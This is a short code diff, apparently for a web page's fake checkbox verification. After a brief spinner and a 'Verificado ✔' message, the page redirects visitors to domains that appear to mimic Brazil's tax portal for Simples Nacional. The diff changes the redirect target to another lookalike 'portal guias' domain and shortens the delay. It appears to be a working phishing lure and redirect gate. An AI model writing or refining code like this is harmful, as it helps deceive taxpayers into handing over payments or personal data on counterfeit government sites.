@@ -84,6 +84,21 @@ body{
   width:22px;
   height:22px;
   cursor:pointer;
+  accent-color:#2563eb;
+  outline:none;
+}
+
+.check-area input:focus{
+  outline:none;
+  box-shadow:none;
+}
+
+.check-area input:invalid{
+  box-shadow:none;
+}
+
+input[type="checkbox"]{
+  appearance:auto;
 }
 
 .check-text{
@@ -215,9 +230,9 @@ check.addEventListener("change", () => {
       loader.style.display = "none";
       text.innerText = "Verificado ✔";
 
-      window.location.href = "https://www8-receitadasmel.com/SimplesNacional/";
+      window.location.href = "https://portalguias-sc.com/portal/";
 
-    }, 2000); // 🔥 4 SEGUNDOS
+    }, 1000);
   }
 
 });
